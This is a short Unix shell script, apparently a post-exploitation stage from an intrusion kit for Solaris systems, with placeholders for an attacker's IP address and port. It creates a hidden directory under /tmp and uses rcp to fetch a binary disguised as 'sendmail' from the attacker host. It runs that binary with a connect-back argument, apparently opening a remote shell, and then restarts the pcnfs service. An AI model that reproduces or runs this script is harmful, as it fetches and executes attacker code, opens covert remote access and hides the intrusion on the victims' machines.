#!/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/usr/local/etc:/usr/sbin:/usr/bin:/opt/SUNWspro/bin:/etc:/usr/ccs/bin:/usr/lib/nis:/usr/sbin:/usr/bin
export PATH
mkdir /tmp/.scsi
cd /tmp/.scsi
rcp ###LOCALIP###:sendmail sendmail 
PATH=. D=-c###LOCALIP###:###PORT### sendmail
/etc/init.d/pcnfs start
